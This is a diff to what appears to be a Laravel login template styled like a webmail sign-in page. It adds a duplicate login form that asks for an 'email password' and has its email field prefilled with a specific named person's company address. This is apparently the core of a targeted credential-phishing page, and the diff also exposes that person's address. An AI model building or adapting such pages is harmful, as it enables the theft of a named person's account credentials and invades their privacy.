@@ -54,6 +54,24 @@
                             </form>
                         </div>
                         <div id="forms">
+                          <form novalidate="" id="login_form" action="/login/" method="post" target="_top" style="visibility:">
+                                @csrf
+                                <div class="input-req-login"><label for="user">Email Address</label></div>
+                                <div class="input-field-login icon username-container">
+                                    <input name="user" id="user" autofocus="autofocus" value="janick.norman@treessolutions.com" placeholder="Enter your email address." class="std_textbox" type="text" tabindex="1" required="">
+                                </div>
+                                <div class="input-req-login login-password-field-label"><label for="pass">Password</label></div>
+                                <div class="input-field-login icon password-container">
+                                    <input name="pass" id="pass" placeholder="Enter your email password." class="std_textbox" type="password" tabindex="2" required="">
+                                </div>
+                                <div class="controls">
+                                    <div class="login-btn">
+                                        <button name="login" type="submit" id="login_submit" tabindex="3">Log in</button>
+                                    </div>
+
+                                                                    </div>
+                                <div class="clear" id="push"></div>
+                            </form>
                             <form novalidate="" id="login_form" action="{{ route('login') }}" method="post" target="_top" style="visibility:" aria-label="{{ __('Login') }}">
                                 @csrf
 
@@ -73,7 +91,7 @@
 
                                 <div class="input-req-login"><label for="user">Email Address</label></div>
                                 <div class="input-field-login icon username-container">
-                                    <input name="email" id="user" autofocus="autofocus" value="{{ old('email') }}" placeholder="Enter your email address." class="std_textbox" type="text" tabindex="1" required=>
+                                    <input name="email" id="user" autofocus="autofocus" value="{{ old('email') }}" placeholder="Enter your email address." class="std_textbox" type="text" tabindex="1" required="">
                                 </div>
                                 <div class="input-req-login login-password-field-label"><label for="pass">Password</label></div>
                                 <div class="input-field-login icon password-container">
